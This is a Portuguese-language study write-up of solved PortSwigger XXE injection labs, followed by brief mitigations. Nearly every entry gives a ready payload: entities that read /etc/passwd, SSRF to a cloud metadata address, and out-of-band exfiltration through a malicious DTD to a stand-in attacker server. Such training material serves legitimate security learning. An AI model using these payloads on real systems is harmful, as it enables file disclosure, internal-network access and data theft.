---

# 📝 XML External Entity (XXE) Injection
## Trilha Completa – PortSwigger Web Security Academy

---

## 🎯 Conceito Geral
A injeção de Entidade Externa XML ocorre quando uma aplicação recebe e processa entrada XML sem restrições adequadas, permitindo que um atacante defina entidades personalizadas para:
- Ler arquivos locais do servidor
- Realizar requisições em nome do servidor (SSRF)
- Extrair dados de forma cega (quando não há retorno direto)
- Executar ações maliciosas por meio de formatos que usam XML (como SVG)

---

## ✅ Laboratórios Resolvidos

### 1. **Apprentice: Exploiting XXE using external entities to retrieve files**
- **Objetivo**: Ler o arquivo `/etc/passwd`
- **Método**: Injetar uma entidade externa diretamente no corpo da requisição XML:
  ```xml
  <!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
  ```
  Usar `&xxe;` no conteúdo que é exibido na resposta.
- **Resultado**: O parser carrega o arquivo e retorna seu conteúdo na resposta.

---

### 2. **Apprentice: Exploiting XXE to perform SSRF attacks**
- **Objetivo**: Acessar um recurso interno do servidor
- **Método**: Definir a entidade para apontar para um endereço interno em vez de um arquivo:
  ```xml
  <!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
  ```
- **Resultado**: O servidor faz a requisição e retorna a resposta do serviço interno.

---

### 3. **Practitioner: Blind XXE with out-of-band interaction**
- **Objetivo**: Acionar uma requisição para fora do alvo (sem retorno direto)
- **Método**: Usar entidade externa chamando o servidor de exploração:
  ```xml
  <!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "https://seu-servidor.exploit/"> ]>
  ```
- **Resultado**: O parser faz a conexão para o seu servidor, confirmando a vulnerabilidade.

---

### 4. **Practitioner: Blind XXE to exfiltrate data using a malicious external DTD**
- **Objetivo**: Extrair dados mesmo sem resposta visível
- **Método**: Hospedar um DTD malicioso no servidor de exploração que concatena o conteúdo do arquivo na URL de requisição ao seu servidor:
  ```xml
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "https://seu-servidor.exploit/dtd.xml">
  %dtd;
  ```
- **Resultado**: O conteúdo do arquivo aparece nos logs de requisição do seu servidor.

---

### 5. **Practitioner: Blind XXE to retrieve data via error messages**
- **Objetivo**: Forçar o retorno do conteúdo em mensagens de erro
- **Método**: Usar um DTD externo que tenta carregar um caminho inválido contendo o dado lido:
  ```xml
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalido/%file;'>">
  %eval;
  %exfil;
  ```
- **Resultado**: O erro do sistema exibe o conteúdo do arquivo.

---

### 6. **Practitioner: Exploiting XInclude to retrieve files**
- **Objetivo**: Extrair dados sem controlar todo o documento XML
- **Método**: Injetar a instrução `XInclude` diretamente no parâmetro que você controla:
  ```xml
  <foo xmlns:xi="http://www.w3.org/2001/XInclude">
    <xi:include parse="text" href="file:///etc/passwd"/>
  </foo>
  ```
- **Resultado**: O sistema embuti sua entrada no XML interno e processa a inclusão do arquivo.

---

### 7. **Practitioner: Exploiting XXE via image file upload**
- **Objetivo**: Explorar upload de arquivos usando o formato SVG (baseado em XML)
- **Método**: Criar um arquivo SVG com entidade externa:
  ```xml
  <?xml version="1.0" standalone="yes"?>
  <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
  <svg><text>&xxe;</text></svg>
  ```
- **Resultado**: Ao processar a imagem, o servidor renderiza o conteúdo do arquivo na visualização.

---

### 8. **Expert: Exploiting XXE to retrieve data by repurposing a local DTD**
- **Objetivo**: Extrair dados sem carregar DTD externo (usando arquivo que já existe no servidor)
- **Método**: Importar um DTD local e redefinir uma entidade existente:
  ```xml
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#39;file:///nonexistent/&#x25;file;&#39;>">
    &#x25;eval;
    &#x25;error;
  '>
  %local_dtd;
  ```
- **Observação**: O laboratório não marcou como concluído automaticamente por falta da licença do Burp Suite Professional, mas a técnica foi aplicada com sucesso e o conteúdo do `/etc/passwd` foi obtido.
- **Resultado**: O parser usa a redefinição e retorna o dado na mensagem de erro.

---

## 📌 Laboratório com Conceito Dominado
> **Blind XXE with out-of-band interaction via XML parameter entities**
- Você já entendeu o funcionamento: usa **entidades de parâmetro** (`%entidade;`) ao invés de entidades comuns, permitindo trabalhar dentro de declarações DTD.
- A ausência de marcação também se deve à limitação da ferramenta, mas o conceito está totalmente dominado.

---

## 🛡️ Mitigações
- Desativar processamento de entidades externas no parser XML
- Usar formatos como JSON em vez de XML
- Validar e higienizar toda entrada recebida
- Usar parsers configurados em modo seguro

---
